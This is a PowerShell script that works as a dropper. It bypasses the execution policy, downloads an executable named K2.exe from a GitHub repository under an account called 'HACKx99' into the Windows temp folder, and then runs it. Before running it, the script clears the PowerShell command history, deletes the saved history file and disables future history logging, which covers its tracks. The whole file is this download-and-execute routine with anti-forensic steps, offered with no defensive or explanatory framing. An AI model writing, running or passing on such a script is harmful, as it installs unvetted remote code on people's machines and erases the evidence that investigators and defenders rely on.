# PowerShell Script to Download, Run EXE with UI, and Clear History
try {
    # Bypass execution policy
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue

    # Define paths and URL
    $exeUrl = "https://github.com/HACKx99/WebSite/raw/main/K2.exe"
    $tempPath = "C:\Windows\Temp\K2.exe"
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    # Download EXE
    Write-Output "Downloading EXE..."
    Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing

    if (Test-Path $tempPath) {
        Write-Output "EXE downloaded successfully"
        
        # Clear PowerShell history
        Write-Output "Clearing history..."
        Clear-History -ErrorAction SilentlyContinue
        if (Test-Path $historyPath) {
            Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
        }
        Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
        
        # Run EXE with visible UI immediately
        Write-Output "Starting EXE with visible UI..."
        Start-Process -FilePath $tempPath -WindowStyle Normal
        Write-Output "EXE is now running with visible interface"
    }

} catch {
    Write-Error "Error: $($_.Exception.Message)"
}
